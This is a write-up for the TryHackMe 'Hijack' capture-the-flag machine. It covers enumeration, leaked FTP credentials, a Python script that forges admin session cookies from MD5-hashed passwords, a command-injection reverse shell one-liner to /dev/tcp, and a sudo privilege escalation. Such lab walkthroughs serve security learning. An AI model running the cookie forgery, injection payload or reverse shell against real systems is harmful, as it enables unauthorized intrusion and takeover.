@@ -1,0 +1,79 @@
+Hijack (TryHackMe) Walkthrough
+
+Description:
+"Misconfigs conquered, identities claimed." — Hijack is a CTF machine focused on misconfigurations, identity exploitation, and privilege escalation.
+
+Steps Taken:
+
+Enumeration
+
+nmap -sC -sV 10.10.125.151
+showmount -e 10.10.125.151
+
+
+Identified FTP, SSH, HTTP, and NFS services.
+
+Found an exposed NFS share /mnt/share.
+
+Initial Access
+
+Explored NFS and FTP shares.
+
+Found employee [ftpuser:REDACTED] credentials 
+
+logged into ftp and found a .passwords_list.txt.
+
+Admin Access via Cookie
+
+Built a Python script to generate admin session cookies from known passwords.
+
+import hashlib
+import base64
+
+# Open the file and read its lines
+with open('passwords_list.txt', 'r') as f:
+    lines = f.readlines()
+
+# Loop through the lines and modify each one
+for line in lines:
+    # Strip the line of bad characters
+    stripped_line = ''.join(filter(str.isalnum, line))
+    # Hash the stripped line using MD5
+    hashed_line = hashlib.md5(stripped_line.encode('utf-8')).hexdigest()
+    # Add "admin:" to the beginning of the hash
+    modified_hash = 'admin:' + hashed_line
+    # Encode the modified hash to base64
+    encoded_hash = base64.b64encode(modified_hash.encode('utf-8'))
+    # Print the encoded hash
+    print(encoded_hash.decode('ascii'))
+
+Successfully bypassed login form and accessed administration.php.
+
+We can check the status of the services on this server:
+
+Injected a command, and now we have RCE, so let's try to get a reverse shell, and we used this payload : & bash -c "bash -i >& /dev/tcp/IP/4444 0>&1", and when we execute it we get a reverse shell :
+
+Privilege Escalation
+
+Retrieved MySQL credentials for a user named rick from config.php.
+
+Upgraded limited reverse shell (www-data) to an interactive shell.
+
+Switched to rick user and used sudo -l to achieve full root access.
+
+Lessons Learned:
+
+File shares and misconfigurations can expose sensitive credentials.
+
+Understanding session handling is key to bypassing authentication.
+
+Enumerate everything and combine multiple vectors for a complete exploit chain.
+
+Tools Used:
+
+nmap, ftp, mount, Python3, ssh, bash
+
+Custom Python scripts for cookie crafting
+
+Outcome:
+Successfully rooted the Hijack machine and documented the full attack chain.
